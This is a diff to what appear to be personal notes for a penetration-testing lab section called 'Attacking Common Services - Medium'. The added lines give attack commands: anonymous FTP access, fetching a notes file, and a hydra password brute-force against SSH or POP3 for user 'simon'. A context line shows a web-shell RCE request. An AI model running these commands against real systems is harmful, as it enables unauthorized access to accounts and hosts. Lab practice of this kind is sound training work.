@@ -12,11 +12,10 @@ RCE:            curl http://$ip/cmd.php?cmd=whoami
 #### Attacking Common Services - Medium:
 ```
 nmap scan:      nmap $ip -p- --open -o nmap.txt | grep '/tcp' | cut -d'/' -f1 | paste -sd, -
-
-
-
-
-
+ftp anonymous:  ftp $ip 30021
+download file:  get mynotes.txt
+PW Bruteforce:  hydra -l simon -P mynotes.txt $ip ssh OR hydra -l simon -P mynotes.txt $ip pop3
+Login:          ssh simon@$ip
 ```
 
 #### Attacking Common Services - Hard:
